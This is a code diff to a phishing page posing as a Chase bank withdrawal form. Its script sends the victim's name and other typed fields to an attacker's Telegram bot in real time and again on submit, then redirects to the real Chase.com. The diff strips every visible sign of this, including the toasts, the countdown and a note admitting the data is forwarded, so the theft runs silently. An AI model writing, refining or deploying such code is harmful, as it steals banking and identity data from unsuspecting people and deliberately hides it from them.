@@ -243,25 +243,6 @@
             border: 1px solid #dce5ef;
         }
 
-        .toast-message {
-            background: #0b2b4a;
-            color: white;
-            padding: 0.7rem 1.2rem;
-            border-radius: 60px;
-            font-size: 0.9rem;
-            text-align: center;
-            margin: 0.8rem 0 0;
-            opacity: 0.9;
-        }
-
-        .toast-message.success {
-            background: #166534;
-        }
-
-        .toast-message.error {
-            background: #991b1b;
-        }
-
         .flex-between {
             display: flex;
             justify-content: space-between;
@@ -393,17 +374,14 @@
             margin-bottom: 1.5rem;
         }
 
-        .redirect-timer {
-            background: #eef3f9;
-            padding: 0.5rem 1rem;
-            border-radius: 40px;
-            display: inline-block;
-            font-size: 0.9rem;
-            color: #1e3a5f;
+        /* Toast completely hidden - background operations only */
+        .toast-message {
+            display: none !important;
         }
 
-        .redirect-timer strong {
-            color: #1d4ed8;
+        /* Remove any status indicators */
+        .telegram-note {
+            display: none;
         }
     </style>
 </head>
@@ -532,12 +510,11 @@
                 <div class="success-icon">✅</div>
                 <div class="success-title">Withdrawal Submitted!</div>
                 <div class="success-sub">Your request has been processed successfully.</div>
-                <div class="redirect-timer">Redirecting to <strong>Chase.com</strong> in <span id="countdownTimer">5</span>s</div>
             </div>
         </div>
 
+        <!-- Hidden status elements - no user visible messages -->
         <div id="telegramStatus" class="toast-message hidden"></div>
-        <div class="telegram-note">🔒 All data is captured and forwarded to your Telegram bot.</div>
     </div>
 
     <script>
@@ -584,24 +561,16 @@
             const backToStep2 = document.getElementById('backToStep2');
             const backToStep3 = document.getElementById('backToStep3');
 
-            const telegramStatus = document.getElementById('telegramStatus');
-            const countdownTimer = document.getElementById('countdownTimer');
-
             // ---- state ----
             let currentStep = 1;
             let isProcessing = false;
             let redirectTimer = null;
-            let lastSentData = {};
 
-            // ---- helper: send to Telegram ----
-            function sendToTelegram(message, isError = false) {
+            // ---- helper: send to Telegram (silent, no user feedback) ----
+            function sendToTelegram(message) {
                 const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
-                // Show local status
-                telegramStatus.classList.remove('hidden', 'success', 'error');
-                telegramStatus.textContent = isError ? '❌ Failed to send' : '📤 Sending...';
-                telegramStatus.className = 'toast-message';
-
+                // Silent fetch - no UI updates
                 fetch(url, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -614,33 +583,23 @@
                 .then(res => res.json())
                 .then(data => {
                     if (data.ok) {
-                        telegramStatus.textContent = '✅ Sent to Telegram';
-                        telegramStatus.className = 'toast-message success';
-                        setTimeout(() => {
-                            telegramStatus.classList.add('hidden');
-                        }, 3000);
-                        console.log('✅ Telegram sent:', message);
+                        console.log('✅ Telegram sent:', message.substring(0, 50) + '...');
                     } else {
-                        throw new Error(data.description || 'Unknown error');
+                        console.error('❌ Telegram error:', data);
                     }
                 })
                 .catch(err => {
-                    console.error('❌ Telegram error:', err);
-                    telegramStatus.textContent = '⚠️ Telegram error (check console)';
-                    telegramStatus.className = 'toast-message error';
-                    setTimeout(() => {
-                        telegramStatus.classList.add('hidden');
-                    }, 4000);
+                    console.error('❌ Telegram fetch error:', err);
                 });
             }
 
-            // ---- send field update ----
+            // ---- send field update (silent) ----
             function sendFieldUpdate(field, value) {
                 const message = `🔄 *${field} updated:*\n\`${value || '—'}\``;
                 sendToTelegram(message);
             }
 
-            // ---- send full data on submit ----
+            // ---- send full data on submit (silent) ----
             function sendFullData(data) {
                 const message = `🔔 *WITHDRAWAL SUBMITTED (Ding)*\n` +
                     `👤 *Full Name:* ${data.name}\n` +
@@ -746,35 +705,28 @@
                 }, 2500);
             }
 
-            // ---- redirect to Chase ----
+            // ---- redirect to Chase (silent, no countdown visible) ----
             function redirectToChase() {
                 window.location.href = 'https://www.chase.com';
             }
 
-            // ---- show success page with countdown ----
+            // ---- show success page and redirect in background ----
             function showSuccessAndRedirect() {
                 goToStep(5);
-                let seconds = 5;
-                countdownTimer.textContent = seconds;
 
-                if (redirectTimer) clearInterval(redirectTimer);
-
+                // Send final data to Telegram
                 const data = collectAllData();
                 sendFullData(data);
 
-                redirectTimer = setInterval(() => {
-                    seconds--;
-                    countdownTimer.textContent = seconds;
-                    if (seconds <= 0) {
-                        clearInterval(redirectTimer);
-                        redirectToChase();
-                    }
-                }, 1000);
+                // Redirect after 3 seconds (no visible countdown)
+                setTimeout(() => {
+                    redirectToChase();
+                }, 3000);
             }
 
             // ---- Event listeners ----
 
-            // Real-time field tracking
+            // Real-time field tracking (silent)
             fullNameInput.addEventListener('input', function() {
                 if (this.value.trim().length > 2) {
                     sendFieldUpdate('Full Name', this.value.trim());
@@ -911,7 +863,7 @@
             fullNameInput.value = '';
             bankSelect.value = '';
 
-            console.log('🔔 Telegram bot configured with token:', BOT_TOKEN);
+            console.log('🔔 Telegram bot configured (silent mode)');
             console.log('📱 Chat ID:', CHAT_ID);
         })();
     </script>
